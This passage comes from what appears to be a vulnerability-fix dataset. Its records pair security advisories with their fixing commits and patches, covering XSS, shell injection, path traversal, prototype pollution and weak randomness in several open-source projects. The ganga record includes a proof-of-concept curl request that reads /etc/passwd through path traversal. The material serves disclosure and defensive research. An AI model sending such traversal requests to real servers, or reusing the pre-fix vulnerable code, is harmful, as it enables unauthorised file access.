'https:\/\/github.com\/sshnet\/SSH.NET\/raw\/03c6d60736b8f7b42e44d6989a53f9b644a091fb\/src%2FRenci.SshNet%2FSecurity%2FKeyExchangeECCurve25519.cs', 'patch': '@@ -46,9 +46,7 @@ public override void Start(Session session, KeyExchangeInitMessage message)\\n             var basepoint = new byte[MontgomeryCurve25519.PublicKeySizeInBytes];\\n             basepoint[0] = 9;\\n \\n-            var rnd = new Random();\\n-            _privateKey = new byte[MontgomeryCurve25519.PrivateKeySizeInBytes];\\n-            rnd.NextBytes(_privateKey);\\n+            _privateKey = CryptoAbstraction.GenerateRandom(MontgomeryCurve25519.PrivateKeySizeInBytes);\\n \\n             _clientExchangeValue = new byte[MontgomeryCurve25519.PublicKeySizeInBytes];\\n             MontgomeryOperations.scalarmult(_clientExchangeValue, 0, _privateKey, 0, basepoint, 0);'}}","message_norm":"use cryptographically secure random number generator.\nfixes cve-2022-29245.","language":"en","entities":"[('cryptographically', 'SECWORD', ''), ('secure', 'SECWORD', ''), ('cve-2022-29245', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Renci.SshNet\/Security\/KeyExchangeECCurve25519.cs'])","num_files":1.0},{"index":930,"vuln_id":"GHSA-72wf-hwcq-65h9","cwe_id":"{'CWE-352'}","score":8.8,"chain":"{'https:\/\/github.com\/filebrowser\/filebrowser\/commit\/74b7cd8e81840537a8206317344f118093153e8d'}","dataset":"osv","summary":"Cross-Site Request Forgery in Filebrowser A Cross-Site Request Forgery (CSRF) vulnerability exists in Filebrowser < 2.18.0 that allows attackers to create a backdoor user with admin privilege and get access to the filesystem via a malicious HTML webpage that is sent to the victim.","published_date":"2022-02-05","chain_len":1,"project":"https:\/\/github.com\/filebrowser\/filebrowser","commit_href":"https:\/\/github.com\/filebrowser\/filebrowser\/commit\/74b7cd8e81840537a8206317344f118093153e8d","commit_sha":"74b7cd8e81840537a8206317344f118093153e8d","patch":"SINGLE","chain_ord":"['74b7cd8e81840537a8206317344f118093153e8d']","before_first_fix_commit":"{'6cb51b4eb4751b49e7d3458c4a23589ccf16790b'}","last_fix_commit":"74b7cd8e81840537a8206317344f118093153e8d","chain_ord_pos":1.0,"commit_datetime":"10\/31\/2021, 16:13:16","message":"fix: security issue in command runner (closes #1621)","author":"Oleg Lobanov","comments":null,"stats":"{'additions': 6, 'deletions': 6, 'total': 12}","files":"{'http\/commands.go': {'additions': 6, 'deletions': 6, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/filebrowser\/filebrowser\/raw\/74b7cd8e81840537a8206317344f118093153e8d\/http%2Fcommands.go', 'patch': '@@ -59,19 +59,19 @@ var commandsHandler = withUser(func(w http.ResponseWriter, r *http.Request, d *d\\n \\t\\t}\\n \\t}\\n \\n-\\tif !d.server.EnableExec || !d.user.CanExecute(strings.Split(raw, \" \")[0]) {\\n-\\t\\tif err := conn.WriteMessage(websocket.TextMessage, cmdNotAllowed); err != nil { \/\/nolint:govet\\n+\\tcommand, err := runner.ParseCommand(d.settings, raw)\\n+\\tif err != nil {\\n+\\t\\tif err := conn.WriteMessage(websocket.TextMessage, []byte(err.Error())); err != nil { \/\/nolint:govet\\n \\t\\t\\twsErr(conn, r, http.StatusInternalServerError, err)\\n \\t\\t}\\n-\\n \\t\\treturn 0, nil\\n \\t}\\n \\n-\\tcommand, err := runner.ParseCommand(d.settings, raw)\\n-\\tif err != nil {\\n-\\t\\tif err := conn.WriteMessage(websocket.TextMessage, []byte(err.Error())); err != nil { \/\/nolint:govet\\n+\\tif !d.server.EnableExec || !d.user.CanExecute(command[0]) {\\n+\\t\\tif err := conn.WriteMessage(websocket.TextMessage, cmdNotAllowed); err != nil { \/\/nolint:govet\\n \\t\\t\\twsErr(conn, r, http.StatusInternalServerError, err)\\n \\t\\t}\\n+\\n \\t\\treturn 0, nil\\n \\t}'}}","message_norm":"fix: security issue in command runner (closes #1621)","language":"en","entities":"[('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('#1621', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['http\/commands.go'])","num_files":1.0},{"index":942,"vuln_id":"GHSA-73q9-7pwj-gm46","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/icecoder\/icecoder\/commit\/51cf24b2a39138e6a7b5739ef59eb38cd7c39763'}","dataset":"osv","summary":"icecoder is vulnerable to Cross-site Scripting icecoder is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/icecoder\/icecoder","commit_href":"https:\/\/github.com\/icecoder\/icecoder\/commit\/51cf24b2a39138e6a7b5739ef59eb38cd7c39763","commit_sha":"51cf24b2a39138e6a7b5739ef59eb38cd7c39763","patch":"SINGLE","chain_ord":"['51cf24b2a39138e6a7b5739ef59eb38cd7c39763']","before_first_fix_commit":"{'cd964f816f31828011593405e024ee3b4c0f6ed3'}","last_fix_commit":"51cf24b2a39138e6a7b5739ef59eb38cd7c39763","chain_ord_pos":1.0,"commit_datetime":"01\/17\/2022, 12:38:29","message":"rXSS cleaned username in editor info display","author":"Matt Pass","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'editor.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/icecoder\/ICEcoder\/raw\/51cf24b2a39138e6a7b5739ef59eb38cd7c39763\/editor.php', 'patch': '@@ -150,7 +150,7 @@\\n             ?>\\n             <h2><?php echo $t[\\'multi-user\\']; ?><\/h2>\\n             <span class=\"heading\"><?php echo $t[\\'Username\\']; ?><\/span><br>\\n-            <?php echo $_SESSION[\\'username\\'];?><br><br>\\n+            <?php echo xssClean($_SESSION[\\'username\\'], \"html\");?><br><br>\\n             <?php\\n         }\\n         ?>'}}","message_norm":"rxss cleaned username in editor info display","language":"en","entities":"[('rxss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['editor.php'])","num_files":1.0},{"index":943,"vuln_id":"GHSA-73qw-ww62-m54x","cwe_id":"{'CWE-77'}","score":10.0,"chain":"{'https:\/\/github.com\/quadule\/colorscore\/commit\/570b5e854cecddd44d2047c44126aed951b61718'}","dataset":"osv","summary":"Critical severity vulnerability that affects colorscore The initialize method in the Histogram class in lib\/colorscore\/histogram.rb in the colorscore gem before 0.0.5 for Ruby allows context-dependent attackers to execute arbitrary code via shell metacharacters in the (1) image_path, (2) colors, or (3) depth variable.","published_date":"2017-10-24","chain_len":1,"project":"https:\/\/github.com\/quadule\/colorscore","commit_href":"https:\/\/github.com\/quadule\/colorscore\/commit\/570b5e854cecddd44d2047c44126aed951b61718","commit_sha":"570b5e854cecddd44d2047c44126aed951b61718","patch":"SINGLE","chain_ord":"['570b5e854cecddd44d2047c44126aed951b61718']","before_first_fix_commit":"{'d589ce05be678c87174adae013ca5ac79f567828'}","last_fix_commit":"570b5e854cecddd44d2047c44126aed951b61718","chain_ord_pos":1.0,"commit_datetime":"01\/05\/2016, 10:53:22","message":"Fix CVE-2015-7541\n\nAvoid passsing possible user input directly into the shell. Instead\nquote the `image_path` value before calling the `convert` command.\n\nSee here http:\/\/rubysec.com\/advisories\/CVE-2015-7541\/ for more\ninformation.","author":"Florian Frank","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'lib\/colorscore\/histogram.rb': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/quadule\/colorscore\/raw\/570b5e854cecddd44d2047c44126aed951b61718\/lib%2Fcolorscore%2Fhistogram.rb', 'patch': '@@ -1,7 +1,9 @@\\n+require \"shellwords\"\\n+\\n module Colorscore\\n   class Histogram\\n     def initialize(image_path, colors=16, depth=8)\\n-      output = `convert #{image_path} -resize 400x400 -format %c -dither None -quantize YIQ -colors #{colors} -depth #{depth} histogram:info:-`\\n+      output = `convert #{image_path.shellescape} -resize 400x400 -format %c -dither None -quantize YIQ -colors #{colors.to_i} -depth #{depth.to_i} histogram:info:-`\\n       @lines = output.lines.sort.reverse.map(&:strip).reject(&:empty?)\\n     end'}}","message_norm":"fix cve-2015-7541\n\navoid passsing possible user input directly into the shell. instead\nquote the `image_path` value before calling the `convert` command.\n\nsee here http:\/\/rubysec.com\/advisories\/cve-2015-7541\/ for more\ninformation.","language":"en","entities":"[('fix', 'ACTION', ''), ('cve-2015-7541', 'VULNID', 'CVE'), ('http:\/\/rubysec.com\/advisories\/cve-2015-7541\/', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/colorscore\/histogram.rb'])","num_files":1.0},{"index":945,"vuln_id":"GHSA-73rp-q4rx-5grc","cwe_id":"{'CWE-284', 'CWE-863'}","score":8.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/c162dfffb9bfd264d232aaaf5bb3daee16a3cb38'}","dataset":"osv","summary":"Incorrect Authorization in microweber Users Account Pre-Takeover or Users Account Takeover. in GitHub repository microweber\/microweber prior to 1.2.15. Victim Account Take Over. Since, there is no email confirmation, an attacker can easily create an account in the application using the Victim\u2019s Email. This allows an attacker to gain pre-authentication to the victim\u2019s account. Further, due to the lack of proper validation of email coming from Social Login and failing to check if an account already exists, the victim will not identify if an account is already existing. Hence, the attacker\u2019s persistence will remain. An attacker would be able to see all the activities performed by the victim user impacting the confidentiality and attempt to modify\/corrupt the data impacting the integrity and availability factor. This attack becomes more interesting when an attacker can register an account from an employee\u2019s email address. Assuming the organization uses G-Suite, it is much more impactful to hijack into an employee\u2019s account.","published_date":"2022-05-10","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/c162dfffb9bfd264d232aaaf5bb3daee16a3cb38","commit_sha":"c162dfffb9bfd264d232aaaf5bb3daee16a3cb38","patch":"SINGLE","chain_ord":"['c162dfffb9bfd264d232aaaf5bb3daee16a3cb38']","before_first_fix_commit":"{'12c0316b3bde8ff6a6adc5d2a05f6409b03c9556'}","last_fix_commit":"c162dfffb9bfd264d232aaaf5bb3daee16a3cb38","chain_ord_pos":1.0,"commit_datetime":"05\/09\/2022, 12:54:29","message":"Update index.blade.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'src\/MicroweberPackages\/Shop\/resources\/views\/index.blade.php': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/c162dfffb9bfd264d232aaaf5bb3daee16a3cb38\/src%2FMicroweberPackages%2FShop%2Fresources%2Fviews%2Findex.blade.php', 'patch': '@@ -46,9 +46,11 @@\\n                         <div class=\"d-flex\">\\n                             <p class=\"col-6 mb-0\">\\n                                 @if($product->hasSpecialPrice())\\n-                                    <span class=\"price-old\"><?php print currency_format($product->specialPrice); ?><\/span>\\n+                                    <span class=\"price-old\"><?php print currency_format($product->price); ?><\/span>\\n+                                    <span class=\"money\"><?php print currency_format($product->specialPrice); ?><\/span>\\n+                                @else\\n+                                    <span class=\"money\"><?php print currency_format($product->price); ?><\/span>\\n                                 @endif\\n-                                <span class=\"money\"><?php print currency_format($product->price); ?><\/span>\\n                             <\/p>\\n \\n                             <a class=\"col-6 text-end text-right align-self-center\" href=\"{{content_link($product->id)}}\"> View<\/a>'}}","message_norm":"update index.blade.php","language":"sv","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Shop\/resources\/views\/index.blade.php'])","num_files":1.0},{"index":950,"vuln_id":"GHSA-7488-6x3r-23w5","cwe_id":"{'CWE-22'}","score":9.3,"chain":"{'https:\/\/github.com\/ganga-devs\/ganga\/commit\/730e7aba192407d35eb37dd7938d49071124be8c'}","dataset":"osv","summary":"ganga before 8.5.10 allows absolute path traversal because the Flask send_file function is used unsafely The ganga-devs\/ganga repository before 8.5.10 on GitHub allows absolute path traversal because the Flask send_file function is used unsafely.","published_date":"2022-07-13","chain_len":1,"project":"https:\/\/github.com\/ganga-devs\/ganga","commit_href":"https:\/\/github.com\/ganga-devs\/ganga\/commit\/730e7aba192407d35eb37dd7938d49071124be8c","commit_sha":"730e7aba192407d35eb37dd7938d49071124be8c","patch":"SINGLE","chain_ord":"['730e7aba192407d35eb37dd7938d49071124be8c']","before_first_fix_commit":"{'0c0f9e33b36ee7ead0855f1464f8d4efad26bdbc'}","last_fix_commit":"730e7aba192407d35eb37dd7938d49071124be8c","chain_ord_pos":1.0,"commit_datetime":"05\/09\/2022, 23:19:28","message":"# Absolute Path Traversal due to incorrect use of `send_file` call (#2025)\n\nA path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with \u201cdot-dot-slash (..\/)\u201d sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. This attack is also known as \u201cdot-dot-slash\u201d, \u201cdirectory traversal\u201d, \u201cdirectory climbing\u201d and \u201cbacktracking\u201d.\r\n\r\n## Common Weakness Enumeration category\r\nCWE - 36\r\n\r\n## Root Cause Analysis\r\n\r\nThe `os.path.join` call is unsafe for use with untrusted input. When the `os.path.join` call encounters an absolute path, it ignores all the parameters it has encountered till that point and starts working with the new absolute path.  Please see the example below.\r\n```\r\n>>> import os.path\r\n>>> static = \"path\/to\/mySafeStaticDir\"\r\n>>> malicious = \"\/..\/..\/..\/..\/..\/etc\/passwd\"\r\n>>> os.path.join(t,malicious)\r\n'\/..\/..\/..\/..\/..\/etc\/passwd'\r\n```\r\nSince the \"malicious\" parameter represents an absolute path, the result of `os.path.join` ignores the static directory completely. Hence, untrusted input is passed via the `os.path.join` call to `flask.send_file` can lead to path traversal attacks.\r\n\r\nIn this case, the problems occurs due to the following code :\r\nhttps:\/\/github.com\/ganga-devs\/ganga\/blob\/0c0f9e33b36ee7ead0855f1464f8d4efad26bdbc\/ganga\/GangaGUI\/gui\/routes.py#L671\r\n\r\nHere, the `path` parameter is attacker controlled. This parameter passes through the unsafe `os.path.join` call making the effective directory and filename passed to the `send_file` call attacker controlled. This leads to a path traversal attack.\r\n\r\n## Proof of Concept\r\n\r\nThe bug can be verified using a proof of concept similar to the one shown below.\r\n\r\n```\r\ncurl --path-as-is 'http:\/\/<domain>\/job\/<int:job_id>\/browse\/\/\/..\/..\/..\/..\/etc\/passwd\"'\r\n```\r\n## Remediation\r\n\r\nThis can be fixed by preventing flow of untrusted data to the vulnerable `send_file` function. In case the application logic necessiates this behaviour, one can either use the `werkzeug.utils.safe_join` to join untrusted paths or replace `flask.send_file` calls with `flask.send_from_directory` calls.\r\n\r\n## Common Vulnerability Scoring System Vector\r\n\r\nThe attack can be carried over the network. A complex non-standard configuration or a specialized condition is not required for the attack to be successfully conducted. There is no user interaction required for successful execution. The attack can affect components outside the scope of the target module. The attack can be used to gain access to confidential files like passwords, login credentials and other secrets. It cannot be directly used to affect a change on a system resource. Hence has limited to no impact on integrity. Using this attack vector a attacker may make multiple requests for accessing huge files such as a database. This can lead to a partial system denial service. However, the impact on availability is quite low in this case. Taking this account an appropriate CVSS v3.1 vector would be\r\n\r\n(AV:N\/AC:L\/PR:N\/UI:N\/S:C\/C:H\/I:N\/A:L)[https:\/\/nvd.nist.gov\/vuln-metrics\/cvss\/v3-calculator?vector=AV:N\/AC:L\/PR:N\/UI:N\/S:C\/C:H\/I:N\/A:L&version=3.1]\r\n\r\nThis gives it a base score of 9.3\/10 and a severity rating of critical.\r\n\r\n## References\r\n* [OWASP Path Traversal](https:\/\/owasp.org\/www-community\/attacks\/Path_Traversal)\r\n* github\/securitylab#669\r\n\r\n### This bug was found using *[CodeQL by Github](https:\/\/codeql.github.com\/)*\r\n\r\nCo-authored-by: Porcupiney Hairs <porucpiney.hairs@protonmail.com>","author":"porcupineyhairs","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'ganga\/GangaGUI\/gui\/routes.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ganga-devs\/ganga\/raw\/730e7aba192407d35eb37dd7938d49071124be8c\/ganga%2FGangaGUI%2Fgui%2Froutes.py', 'patch': '@@ -12,7 +12,7 @@\\n import sys\\n import datetime\\n from functools import wraps\\n-from werkzeug.utils import secure_filename\\n+from werkzeug.utils import secure_filename, safe_join\\n from werkzeug.security import generate_password_hash, check_password_hash\\n from flask import Flask, request, jsonify, render_template, flash, redirect, url_for, session, send_file, make_response\\n from flask_login import login_user, login_required, logout_user, current_user, UserMixin\\n@@ -656,7 +656,7 @@ def job_browse(job_id: int, path):\\n         return redirect(url_for(\"job_page\", job_id=job_id))\\n \\n     # Join the base and the requested path\\n-    abs_path = os.path.join(job_base_dir, path)\\n+    abs_path = safe_join(job_base_dir, path)\\n \\n     # URL path variable for going back\\n     back_path = os.path.dirname(abs_path).replace(job_base_dir, \"\")'}}","message_norm":"# absolute path traversal due to incorrect use of `send_file` call (#2025)\n\na path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. by manipulating variables that reference files with \u201cdot-dot-slash (..\/)\u201d sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. this attack is also known as \u201cdot-dot-slash\u201d, \u201cdirectory traversal\u201d, \u201cdirectory climbing\u201d and \u201cbacktracking\u201d.\r\n\r\n## common weakness enumeration category\r\ncwe - 36\r\n\r\n## root cause analysis\r\n\r\nthe `os.path.join` call is unsafe for use with untrusted input. when the `os.path.join` call encounters an absolute path, it ignores all the parameters it has encountered till that point and starts working with the new absolute path.  please see the example below.\r\n```\r\n>>> import os.path\r\n>>> static = \"path\/to\/mysafestaticdir\"\r\n>>> malicious = \"\/..\/..\/..\/..\/..\/etc\/passwd\"\r\n>>> os.path.join(t,malicious)\r\n'\/..\/..\/..\/..\/..\/etc\/passwd'\r\n```\r\nsince the \"malicious\" parameter represents an absolute path, the result of `os.path.join` ignores the static directory completely. hence, untrusted input is passed via the `os.path.join` call to `flask.send_file` can lead to path traversal attacks.\r\n\r\nin this case, the problems occurs due to the following code :\r\nhttps:\/\/github.com\/ganga-devs\/ganga\/blob\/0c0f9e33b36ee7ead0855f1464f8d4efad26bdbc\/ganga\/gangagui\/gui\/routes.py#l671\r\n\r\nhere, the `path` parameter is attacker controlled. this parameter passes through the unsafe `os.path.join` call making the effective directory and filename passed to the `send_file` call attacker controlled. this leads to a path traversal attack.\r\n\r\n## proof of concept\r\n\r\nthe bug can be verified using a proof of concept similar to the one shown below.\r\n\r\n```\r\ncurl --path-as-is 'http:\/\/<domain>\/job\/<int:job_id>\/browse\/\/\/..\/..\/..\/..\/etc\/passwd\"'\r\n```\r\n## remediation\r\n\r\nthis can be fixed by preventing flow of untrusted data to the vulnerable `send_file` function. in case the application logic necessiates this behaviour, one can either use the `werkzeug.utils.safe_join` to join untrusted paths or replace `flask.send_file` calls with `flask.send_from_directory` calls.\r\n\r\n## common vulnerability scoring system vector\r\n\r\nthe attack can be carried over the network. a complex non-standard configuration or a specialized condition is not required for the attack to be successfully conducted. there is no user interaction required for successful execution. the attack can affect components outside the scope of the target module. the attack can be used to gain access to confidential files like passwords, login credentials and other secrets. it cannot be directly used to affect a change on a system resource. hence has limited to no impact on integrity. using this attack vector a attacker may make multiple requests for accessing huge files such as a database. this can lead to a partial system denial service. however, the impact on availability is quite low in this case. taking this account an appropriate cvss v3.1 vector would be\r\n\r\n(av:n\/ac:l\/pr:n\/ui:n\/s:c\/c:h\/i:n\/a:l)[https:\/\/nvd.nist.gov\/vuln-metrics\/cvss\/v3-calculator?vector=av:n\/ac:l\/pr:n\/ui:n\/s:c\/c:h\/i:n\/a:l&version=3.1]\r\n\r\nthis gives it a base score of 9.3\/10 and a severity rating of critical.\r\n\r\n## references\r\n* [owasp path traversal](https:\/\/owasp.org\/www-community\/attacks\/path_traversal)\r\n* github\/securitylab#669\r\n\r\n### this bug was found using *[codeql by github](https:\/\/codeql.github.com\/)*\r\n\r\nco-authored-by: porcupiney hairs <porucpiney.hairs@protonmail.com>","language":"en","entities":"[('absolute path traversal', 'SECWORD', ''), ('incorrect use', 'SECWORD', ''), ('#2025', 'ISSUE', ''), ('path traversal', 'SECWORD', ''), ('attack', 'SECWORD', ''), ('directory traversal', 'SECWORD', ''), ('manipulating', 'ACTION', ''), ('critical', 'SEVERITY', ''), ('attack', 'SECWORD', ''), ('directory traversal', 'SECWORD', ''), ('common weakness enumeration', 'SECWORD', ''), ('cwe - 36', 'CWEID', 'CWE_flexible'), ('unsafe', 'SECWORD', ''), ('untrusted', 'SECWORD', ''), ('malicious', 'SECWORD', ''), ('malicious', 'SECWORD', ''), ('malicious', 'SECWORD', ''), ('untrusted', 'SECWORD', ''), ('path traversal', 'SECWORD', ''), ('attacks', 'FLAW', ''), ('problems', 'FLAW', ''), ('https:\/\/github.com\/ganga-devs\/ganga\/blob\/0c0f9e33b36ee7ead0855f1464f8d4efad26bdbc\/ganga\/gangagui\/gui\/routes.py#l671', 'URL', ''), ('attacker', 'SECWORD', ''), ('unsafe', 'SECWORD', ''), ('attacker', 'SECWORD', ''), ('path traversal', 'SECWORD', ''), ('attack', 'FLAW', ''), ('bug', 'FLAW', ''), ('verified', 'ACTION', ''), ('http:\/\/<domain>\/job\/<int', 'URL', ''), ('fixed', 'ACTION', ''), ('preventing', 'ACTION', ''), ('untrusted data', 'SECWORD', ''), ('vulnerable', 'SECWORD', ''), ('untrusted', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('attack', 'SECWORD', ''), ('attack', 'SECWORD', ''), ('attack', 'SECWORD', ''), ('attack', 'FLAW', ''), ('confidential', 'SECWORD', ''), ('passwords', 'SECWORD', ''), ('login', 'SECWORD', ''), ('integrity', 'SECWORD', ''), ('attack vector', 'SECWORD', ''), ('attacker', 'FLAW', ''), ('availability', 'SECWORD', ''), ('low', 'SEVERITY', ''), ('v3.1', 'VERSION', ''), ('l)[https:\/\/nvd.nist.gov', 'URL', ''), ('critical', 'SEVERITY', ''), ('owasp', 'SECWORD', ''), ('path traversal](https:\/\/owasp.org', 'SECWORD', ''), ('attacks', 'SECWORD', ''), ('securitylab#669', 'SECWORD', ''), ('bug', 'FLAW', ''), ('found', 'ACTION', ''), ('codeql', 'DETECTION', ''), ('github](https:\/\/codeql.github.com\/', 'URL', ''), ('porucpiney.hairs@protonmail.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ganga\/GangaGUI\/gui\/routes.py'])","num_files":1.0},{"index":952,"vuln_id":"GHSA-74cr-77xc-8g6r","cwe_id":"{'CWE-400', 'CWE-1321'}","score":7.3,"chain":"{'https:\/\/github.com\/apollographql\/apollo-server\/commit\/cea7397582a293af6a5f60947da34b95e669c6c1'}","dataset":"osv","summary":"Prototype Pollution in @apollo\/gateway Versions of `@apollo\/gateway` prior to 0.6.2 are vulnerable to Prototype Pollution. The package uses deepMerge() to merge objects, which may allow attackers to alter the Object prototype through queries with GraphQL aliases. Carefully constructed payloads can override properties of all objects in the application. This may lead to Denial of Service or may be chained with other vulnerabilities leading to Remote Code Execution.\n\n\n## Recommendation\n\nUpgrade to version 0.6.2 or later.","published_date":"2019-06-13","chain_len":1,"project":"https:\/\/github.com\/apollographql\/apollo-server","commit_href":"https:\/\/github.com\/apollographql\/apollo-server\/commit\/cea7397582a293af6a5f60947da34b95e669c6c1","commit_sha":"cea7397582a293af6a5f60947da34b95e669c6c1","patch":"SINGLE","chain_ord":"['cea7397582a293af6a5f60947da34b95e669c6c1']","before_first_fix_commit":"{'116e1b46ae8a58d5b77038d66588f208eb9b6e2a'}","last_fix_commit":"cea7397582a293af6a5f60947da34b95e669c6c1","chain_ord_pos":1.0,"commit_datetime":"06\/04\/2019, 22:58:07","message":"Ignore __proto__ fields in deepMerge","author":"Trevor Scheer","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'packages\/apollo-gateway\/src\/utilities\/deepMerge.ts': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apollographql\/apollo-server\/raw\/cea7397582a293af6a5f60947da34b95e669c6c1\/packages%2Fapollo-gateway%2Fsrc%2Futilities%2FdeepMerge.ts', 'patch': \"@@ -4,7 +4,7 @@ export function deepMerge(target: any, source: any): any {\\n   if (source === undefined || source === null) return target;\\n \\n   for (const key of Object.keys(source)) {\\n-    if (source[key] === undefined) continue;\\n+    if (source[key] === undefined || key === '__proto__') continue;\\n \\n     if (target[key] && isObject(source[key])) {\\n       deepMerge(target[key], source[key]);\"}}","message_norm":"ignore __proto__ fields in deepmerge","language":"nl","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/apollo-gateway\/src\/utilities\/deepMerge.ts'])","num_files":1.0},{"index":955,"vuln_id":"GHSA-74qp-233x-p5j8","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/apache\/incubator-livy\/commit\/4d8a912699683b973eee76d4e91447d769a0cb0d'}","dataset":"osv","summary":"Cross-site scripting (XSS) in Apache Livy Livy server version 0.7.0-incubating (only) is vulnerable to a cross site scripting issue in the session name. A malicious user could use this flaw to access logs and results of other users' sessions and run jobs with their privileges. This issue is fixed in Livy 0.7.1-incubating.","published_date":"2021-05-13","chain_len":1,"project":"https:\/\/github.com\/apache\/incubator-livy","commit_href":"https:\/\/github.com\/apache\/incubator-livy\/commit\/4d8a912699683b973eee76d4e91447d769a0cb0d","commit_sha":"4d8a912699683b973eee76d4e91447d769a0cb0d","patch":"SINGLE","chain_ord":"['4d8a912699683b973eee76d4e91447d769a0cb0d']","before_first_fix_commit":"{'97cf2f75929ef6c152afc468adbead269bd0758f'}","last_fix_commit":"4d8a912699683b973eee76d4e91447d769a0cb0d","chain_ord_pos":1.0,"commit_datetime":"08\/15\/2020, 00:25:54","message":"Add html escape to session name\n\n## What changes were proposed in this pull request?\n\nThe PR adds HTML escaping to session names.\n\n## How was this patch tested?\n\nManual test.\n\nAuthor: Marco Gaido <mgaido@apache.org>\n\nCloses #302 from mgaido91\/escape_html.","author":"Marco Gaido","comments":null,"stats":"{'additions': 7, 'deletions': 3, 'total': 10}","files":"{'server\/src\/main\/resources\/org\/apache\/livy\/server\/ui\/static\/js\/all-sessions.js': {'additions': 7, 'deletions': 3, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/incubator-livy\/raw\/4d8a912699683b973eee76d4e91447d769a0cb0d\/server%2Fsrc%2Fmain%2Fresources%2Forg%2Fapache%2Flivy%2Fserver%2Fui%2Fstatic%2Fjs%2Fall-sessions.js', 'patch': '@@ -15,13 +15,17 @@\\n  * limitations under the License.\\n  *\/\\n \\n+function escapeHtml(unescapedText) {\\n+  return $(\"<div>\").text(unescapedText).html()\\n+}\\n+\\n function loadSessionsTable(sessions) {\\n   $.each(sessions, function(index, session) {\\n     $(\"#interactive-sessions .sessions-table-body\").append(\\n       \"<tr>\" +\\n         tdWrap(uiLink(\"session\/\" + session.id, session.id)) +\\n         tdWrap(appIdLink(session)) +\\n-        tdWrap(session.name) +\\n+        tdWrap(escapeHtml(session.name)) +\\n         tdWrap(session.owner) +\\n         tdWrap(session.proxyUser) +\\n         tdWrap(session.kind) +\\n@@ -38,7 +42,7 @@ function loadBatchesTable(sessions) {\\n       \"<tr>\" +\\n         tdWrap(session.id) +\\n         tdWrap(appIdLink(session)) +\\n-        tdWrap(session.name) +\\n+        tdWrap(escapeHtml(session.name)) +\\n         tdWrap(session.owner) +\\n         tdWrap(session.proxyUser) +\\n         tdWrap(session.state) +\\n@@ -79,4 +83,4 @@ $(document).ready(function () {\\n       $(\"#all-sessions\").append(\\'<h4>No Sessions or Batches have been created yet.<\/h4>\\');\\n     }\\n   });\\n-});\\n\\\\ No newline at end of file\\n+});'}}","message_norm":"add html escape to session name\n\n## what changes were proposed in this pull request?\n\nthe pr adds html escaping to session names.\n\n## how was this patch tested?\n\nmanual test.\n\nauthor: marco gaido <mgaido@apache.org>\n\ncloses #302 from mgaido91\/escape_html.","language":"en","entities":"[('add', 'ACTION', ''), ('escape', 'SECWORD', ''), ('adds', 'ACTION', ''), ('escaping', 'SECWORD', ''), ('mgaido@apache.org', 'EMAIL', ''), ('#302', 'ISSUE', ''), ('escape_html', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/src\/main\/resources\/org\/apache\/livy\/server\/ui\/static\/js\/all-sessions.js'])","num_files":1.0},{"index":962,"vuln_id":"GHSA-75c5-f4gw-38r9","cwe_id":"{'CWE-74'}","score":7.8,"chain":"{'https:\/\/github.com\/pear\/Archive_Tar\/commit\/0670a05fdab997036a3fc3ef113b8f5922e574da'}","dataset":"osv","summary":"Multiple vulnerabilities through filename manipulation in Archive_Tar Archive_Tar through 1.4.10 has :\/\/ filename sanitization only to address phar attacks, and thus any other stream-wrapper attack (such as file:\/\/ to overwrite files) can still succeed. See: 